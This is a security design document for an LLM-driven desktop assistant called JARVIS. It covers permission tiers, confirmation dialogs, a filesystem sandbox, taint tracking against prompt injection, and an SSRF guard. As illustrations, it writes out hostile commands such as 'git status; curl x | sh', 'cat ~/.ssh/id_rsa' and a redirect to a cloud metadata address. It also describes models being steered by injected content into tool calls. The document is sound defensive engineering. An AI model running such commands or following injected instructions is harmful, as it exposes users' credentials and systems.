# Security Model

> Status: §1 (permission engine + confirmation) implemented in M4.2, with `run_command` added in M4.4; §2 (filesystem sandbox) and §3 (taint) in M4.3; §4's `web_fetch` + SSRF guard in M4.5. §5 (extensions) is still pending. This document is normative — code that disagrees with it is wrong, and where implementation forced a change the document was amended rather than quietly diverged from (see §1's dialog note).

JARVIS runs shell commands, reads files, and fetches web pages, driven by an LLM that can be manipulated by anything it reads. We treat that as the threat model, not an edge case. We also say plainly what this is: **policy enforcement in a trusted process**, not OS-level sandboxing (no seccomp / sandbox-exec in v1).

## 1. Tool permission model

Every tool has a risk level: `safe` / `ask` / `dangerous`.

- `safe` (e.g. `list_dir`, `send_notification`): runs freely.
- `ask` (e.g. `write_file`, `get_clipboard` — yes, clipboard is `ask`: clipboards contain passwords): confirmation dialog showing the exact action and arguments.
- `dangerous` (e.g. `delete`, anything network-writing): per-call confirmation, globally disableable (`[tools] allow_dangerous` in config.toml; off means refused without even asking).

`run_command` **always confirms, full command text shown, no exceptions.** There is no command classifier and no denylist — both are bypass generators. A future opt-in allowlist may skip confirmation for *exact-match* previously-approved commands only.

### The dialog is in-app, not a native OS dialog (amended M4.2)

This document originally specified a native OS dialog. It is a React modal instead, and the reason is that native would not have bought the property it was there for.

The confirmation originates in the Python backend and the answer returns over the same WebSocket. Driving `tauri-plugin-dialog` from the webview makes the path backend → WS → **webview** → IPC → Rust → OS dialog → **webview** → WS → backend: a compromised webview simply skips the `invoke` and replies "allowed". The webview stays in the trust path either way, so the native dialog is ceremony with real costs — two buttons only (no "allow for this session"), no API to put default focus on Cancel, a zenity/XDG-portal dependency on Linux where a missing dialog fails into deny, no monospace or scrolling for a long command, and undriveable by the headless verification this project relies on. The only variant that genuinely removes the webview is Rust holding its own authenticated socket to the sidecar, which is a second IPC surface that dies in any browser-hosted build.

**What actually carries the security here is identical for both, and is normative:**

- The **backend** mints the correlation id. A confirmation is only ever *requested* by the backend, never *asserted* by a client — there is no message a client can send that approves something out of nowhere.
- Ids are **single-use**. Unknown or already-settled ids are dropped in silence (a second window answering is ordinary traffic, not an error).
- **Absence of an answer is a deny.** No UI connected, every send failed, timeout elapsed, broker raised — all refuse. There is no path where "we couldn't ask" becomes "go ahead".
- The request is **broadcast to every connection**, never the newest one: reloads leave authenticated zombie connections behind, and a stale page must not be able to swallow a confirmation.
- A cancelled generation **dismisses its dialog**. A dialog that outlives the call it asked about is how a user is trained to click Allow without reading.

### "Allow for this session"

Keyed on **tool + exact arguments** (canonical JSON), held in process memory, never written to disk — restarting the backend forgets everything, which is the promise the phrase makes. Approving `git status` therefore does not approve `git status; curl x | sh`. This is the same "exact-match previously-approved" rule stated above for `run_command`.

It is **never honoured for `dangerous`**, which is per-call confirmation and means it. The UI hides the button there, and the backend refuses to record the grant regardless — the button is in a webview and the enforcement is not.

A refusal is also remembered for the rest of the exchange, so a model that re-asks after being told no cannot manufacture a second dialog. That is confirmation fatigue with no attacker in it.

### `run_command`: what it is, and what it is not (M4.4)

Implemented in `backend/jarvis_backend/tools/shell.py`; the lifecycle tests are
`backend/tests/test_shell.py`.

It runs the command **verbatim** through a shell (so pipes, `&&` and redirects
work) and inspects it not at all — the no-classifier, no-denylist rule above is a
property of the code, not just a promise. The dialog is the generic one: the full
command renders in the scrollable monospace argument block, Deny is focused, and
because the tool is `dangerous` there is no "allow for this session" button.

**The shell is not sandboxed, and the docs must not let it seem otherwise.** §2's
filesystem sandbox is a policy check *inside* `read_file`/`write_file`/`delete_file`;
it governs those tools, not the process. `run_command` spawns a subprocess, so
`cat ~/.ssh/id_rsa` — or `curl … | sh`, or anything at all — ignores every root
in §2. **Its only protection is the unconditional confirmation**, and that is why
the confirmation is unconditional. Two consequences are called out so nobody
mistakes a convenience for a boundary:

- **Working directory is the user's home**, and that is a usability default, not
  containment: a shell `cd`s anywhere, so pinning it to a sandbox root would only
  imply a wall that isn't there. Any project is reached by an absolute `cd` inside
  the command the user already sees and approves.
- **The environment is inherited minus the `JARVIS_*` namespace.** The user's
  `PATH`/`HOME`/etc. are kept — a shell that can't find their tools won't get used
  — but the app's own variables are stripped, above all `JARVIS_WS_TOKEN`: the
  WebSocket auth secret must never reach a subprocess. This is hygiene, not a
  sandbox; the user's other secrets stay in the environment, and a command that
  would exfiltrate them is shown in full and confirmed first.

**A non-exiting command cannot hold the app hostage.** There is one generation
slot and no protocol for streaming a command's output, so `run_command` is a
quick-command tool, not a build runner. A 30s timeout (overridable via
`JARVIS_SHELL_TIMEOUT_S` for headless verification; the packaged app never sets
it) and a 64 KB incremental output cap bound the slot and the memory — the cap is
read as the bytes arrive, because `communicate()` would let `yes` or
`cat /dev/urandom` balloon RAM before any timeout fired. On a timeout, a
cancellation (barge-in / stop / delete), or the cap, the **whole process group**
is killed (new session at spawn + `killpg`), so a backgrounded child is never
orphaned.

**Taint still applies.** A command that follows a `read_file` in the same
conversation escalates through the same `PermissionGate`/broker path as any other
side-effectful call, and the dialog names the source — the shell is `dangerous`
already, so what taint adds here is the provenance line, not the confirmation.

### `JARVIS_DEV_TOOLS` (development affordance)

With `JARVIS_DEV_TOOLS=1` the registry gains an `ask`-risk `echo` tool whose body returns its own argument. It exists because the permission engine ships a milestone ahead of the first tool that needs it, and a dialog never seen in the real webview is not a verified dialog. It grants no capability — it is a mirror — and it passes through the full gate like anything else. The packaged app never sets the variable.

## 2. Filesystem sandbox

Filesystem tools operate only under user-configured roots. Enforcement happens on **`Path.resolve()`-ed (symlink-resolved) absolute paths** — checking the path the user typed is not enforcement. Escaping requires explicit per-path user opt-in. The extensions directory and JARVIS's own config/data directories are **permanently outside** all sandbox roots, so no tool can self-escalate by writing an extension or editing permissions.

Implemented in `backend/jarvis_backend/security/sandbox.py`; the escape cases are `backend/tests/test_sandbox.py`.

- **Defaults: Documents, Downloads, Desktop** (`[filesystem] roots` in config.toml, resolved per-OS by platformdirs). Not the whole home directory, so dotfiles, `~/.ssh` and shell history are out of reach on day one. Downloads is included deliberately even though it is where untrusted files land — that is the case §3 exists for, and excluding it would just mean the assistant cannot help with the folder people most want help with.
- **Absent key ⇒ defaults; an explicit `roots = []` ⇒ no file access at all.** The two look alike in a naive lookup and mean opposite things; an empty allowlist that quietly means "allow everything" is a classic and is not ours.
- **Exclusions are checked before roots**, so "inside a configured root" can never override "inside Jarvis's own directories" — which matters because on Linux the config and data dirs legitimately live under the home directory.
- **Deny-side comparisons are casefolded and NFC-normalised; allow-side ones are exact.** `resolve()` settles symlinks and `..`, but not *spelling*: macOS and Windows are case-insensitive, and APFS is normalisation-insensitive as well, so one file has many `Path.parts` spellings. Comparing exactly meant `<root>/Jarvis-Config/config.toml` slipped past the exclusion, matched the root, and reached the real config — the self-escalation this section exists to prevent (fixed M4.3+, `Sandbox._fold`). The asymmetry is deliberate: folding a check whose match means *deny* can only ever refuse more, while folding the **roots** check would hand the sandbox directories the user never configured on a case-sensitive filesystem, where `~/documents` and `~/Documents` are genuinely two places.
- Relative paths are **refused**, never resolved against the process's working directory: the model does not know what that is, so the same argument would name different files on different runs, and one of those would eventually land outside the sandbox.
- Roots are resolved at construction too, because `~/Documents` is a symlink on plenty of real machines (iCloud Drive); comparing an unresolved root against resolved paths would deny everything it is supposed to allow.

## 2a. File tools (M4.3)

`read_file` and `list_dir` are `safe`, `write_file` is `ask`, `delete_file` is `dangerous`. Deleting a **directory** is refused outright rather than approximated: one confirmation cannot honestly represent an unbounded set of files.

Reading is deliberately free of confirmation — it changes nothing, and a prompt per file is the fatigue this document warns about. What carries the security is that a read **taints** (§3). The residual risk is silent reading into context, which matters mainly with a cloud backend; §6's screen warning is the natural place that extends to.

## 3. Taint tracking (prompt-injection defense)

Delimiters around untrusted content are labeling, not defense. The mechanism:

- Content from `web_fetch`, `web_search` results, or files outside a trusted set marks the conversation **tainted**.
- From that point, *every* side-effectful tool call — regardless of its normal risk level — escalates to explicit confirmation, and the dialog says why ("this request follows content from example.com").
- Enforced in the tool-execution layer (`backend/jarvis_backend/security/taint.py`), never in the prompt.

Implemented in M4.3. How it actually works, and the parts worth knowing:

- **A tool declares its own taint.** `read_file` returns a `ToolOutput` carrying the path it read; the agent loop turns that into conversation taint. Nothing downstream can infer "untrusted" from the text itself — which is exactly why prompt-side labeling fails.
- **Conversation-scoped and sticky for the process's life**, in memory, never persisted (same posture as §1's session grants). Sticky across turns on purpose: the raw tool result is *not* replayed to the model in later turns, but the assistant's own prose about it is, so a laundered instruction outlives the exchange that introduced it.
- **A tainted call is never grantable, in both directions.** A session grant given before the untrusted content arrived does not cover a call made after it, and approving a tainted call grants nothing for later. The grant key is only tool+arguments, and an injection reuses exactly those — the taint is the only thing that can tell the two calls apart, so it wins.
- The dialog shows the source path and hides "allow for this session"; the backend refuses to record one regardless, since the button is in a webview and the enforcement is not.
- **Scope limit, stated so it cannot drift:** the escalation of *safe* side-effectful tools is satisfied vacuously today, because in this codebase `safe` means read-only and everything side-effectful is already `ask` or higher. If a `safe` tool with a real side effect is ever added (`send_notification` is the candidate this document names), it must be classified `ask`, or the gate must learn a per-tool side-effect flag. `PermissionGate.check` carries the comment and `test_taint.py` carries the tripwire.

## 4. Network guards

- Backend binds `127.0.0.1` only. WebSocket requires a per-session token *and* a strict `Origin` check (defeats browser drive-bys against localhost).

### `web_fetch` and the SSRF guard (M4.5)

Implemented in `backend/jarvis_backend/tools/web.py` (the fetch) and
`backend/jarvis_backend/security/ssrf.py` (the guard); tests are `test_web.py`
and `test_ssrf.py`. `web_fetch` is the tool taint (§3) exists for — its result is
the canonical untrusted content — and the only tool that reaches the network.

- **Risk is `ask`.** Every fetch confirms, showing the URL, because a URL can
  carry data *out* (exfiltration) and that is the defense the SSRF guard cannot
  provide. `safe` is off the table: web egress is a side effect, and §3's
  invariant is that `safe` means read-only. Session grants still apply to an exact
  repeat URL, so re-fetching the same page does not re-ask; a different URL does.
- **Scheme allowlist:** `http`/`https` only. `file://`, `gopher://`, `ftp://` and
  friends are refused before anything is resolved — they are pure SSRF vectors.
- **Resolve, then check every IP.** The host is resolved (an IP-literal host is
  validated directly, never resolved) and refused if **any** address is not
  globally routable. The check uses `ipaddress` classification (private, loopback,
  link-local, multicast, unspecified, reserved), a **superset** of the ranges this
  section used to list by hand (127.0.0.0/8, 10/8, 172.16/12, 192.168/16,
  169.254/16, ::1, fc00::/7): it also covers IPv6, IPv4-mapped addresses
  (`::ffff:127.0.0.1`), and alternate encodings getaddrinfo decodes (decimal
  `2130706433` → `127.0.0.1`). The **any-IP** rule matters — a host with one
  public and one private record must be refused, or it is a trivial bypass.
- **Every redirect hop is re-validated.** A 302 to `http://169.254.169.254/` is
  how an allowed first hop becomes an internal one; redirects are followed by hand
  (capped at 5) so each target passes the same check.
- **Bounded, like the shell:** a 512 KB incremental read cap (a huge body must not
  balloon RAM on the 8 GB target) and a 15 s timeout (env-overridable
  `JARVIS_FETCH_TIMEOUT_S`; a slow server must not hold the single generation
  slot). HTML is reduced to text with the stdlib parser. A non-200 status is shown
  in the result (`[HTTP 404]`), a result the model must see — not a tool failure,
  the same call as shell's exit code.
- **Not a phone-home.** A user-directed, confirmed fetch is a browser action, not
  telemetry; the zero-telemetry principle (§6) is about JARVIS reaching out on its
  own, which this is not, and offline operation is unaffected (the fetch just
  fails).

**Documented residual — DNS rebinding.** There is a TOCTOU window between the
resolve the guard checks and the resolve httpx does at connect time. An attacker
controlling DNS for a host the model was steered to, with a 0-TTL record, could
answer public to the check and private to the socket. The common vectors — direct
internal IPs/hosts, the metadata endpoint, and a redirect to an internal target —
are all closed; closing rebinding needs pinning the connection to the validated
IP while preserving Host/SNI (fragile custom-transport plumbing), deferred for v1.
This is the same posture §2 takes for the file-tool TOCTOU.

## 5. Extensions

- Manifest declares platforms, required OS permissions, and per-tool risk levels. The approval dialog at install/load shows **declared permissions**, not just source code (nobody reads 500 lines of source; everybody reads "wants: calendar access, network").
- `jarvis install <url>` pins the commit SHA at install. **No extension auto-update.**
- Extension-declared risk levels are floors, not ceilings — the core permission engine can raise them, never lower.

## 6. Credentials, screen, telemetry

- API keys never appear in prompts, logs, or exports. (Enforced by redaction at the config boundary.)
- `take_screenshot` with a **cloud backend** active warns explicitly: your screen is about to leave this machine.
- Telemetry: none. The model catalog is bundled data; refreshing it is a manual, explicit action — no automatic phone-home, ever.

## Known limitations (v1, documented on purpose)

- Same-process policy enforcement: a bug in the backend is a bug in the sandbox.
- TOCTOU windows between path resolution and file operation.
- Confirmation fatigue is a real attack surface; UX must keep confirmations rare enough to be read.
- **The database is not encrypted.** `jarvis.sqlite3` holds every conversation in plain text, readable by any process running as the user. Deleting a conversation removes the rows; it does not shred them, and SQLite may keep the bytes in freed pages until they are reused. This is the same posture as the shell history and browser profile sitting next to it, and full-disk encryption is the mitigation — but it is not implied anywhere in the UI, so it is stated here.
- **The sandbox governs *file tools*, not the process.** It is a policy check inside `read_file`/`write_file`/`delete_file`, so anything that runs code outside them is unaffected. This became load-bearing when `run_command` landed in M4.4: `cat ~/.ssh/id_rsa` ignores every root in this section. Shell's protection is its unconditional confirmation, not the sandbox — see §1's `run_command` subsection, which says so at length.
- **A `safe` tool still reads.** `read_file` needs no confirmation by design (§2a), so a manipulated model can read any file under a root and put its contents in the conversation before anything is shown to the user. Taint makes the *consequences* confirm; it does not un-read the file. With a cloud backend that content has also left the machine.
- **Only macOS has been exercised by hand.** Windows and Linux path handling — drive letters, UNC paths, 8.3 short names, `\\?\` prefixes, case rules that differ per volume — is covered by CI's test run and nothing else. The deny-side folding above closes the case-insensitivity class generically, but no one has run a file tool on those platforms.
- **`web_fetch` has a DNS-rebinding TOCTOU window.** The SSRF guard checks the IPs it resolves, but httpx resolves again at connect time; a 0-TTL attacker DNS could differ between the two. The direct vectors (internal IPs/hosts, metadata, redirect-to-internal) are closed — see §4 for the full note and why closing rebinding is deferred.
